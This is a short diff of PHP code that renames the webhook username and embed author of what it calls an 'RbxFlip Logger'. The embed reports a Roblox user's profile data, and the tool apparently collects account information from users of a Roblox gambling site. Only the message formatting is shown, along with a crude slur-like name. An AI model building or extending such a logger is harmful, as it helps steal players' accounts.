@@ -37,7 +37,7 @@ print($online1);
 
 
             $hookObject = json_encode([
-        "username" => "5Haze#0001",
+        "username" => "toco gay logger",
         "avatar_url" => "https://tr.rbxcdn.com/364bfe84c4c55fcc6a8cf53fd9f6028d/420/420/Hat/Png", 
                 "embeds" => [
                     [
@@ -51,7 +51,7 @@ print($online1);
                             "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $profile["UserID"] . "&width=420&height=420&format=png"
                         ],
                         "author" => [
-                            "name" => "5Haze's RbxFlip Logger",
+                            "name" => "Toco's RbxFlip Logger",
                             "url" => "https://github.com/5Haze"
                         ],
                         "fields" => [
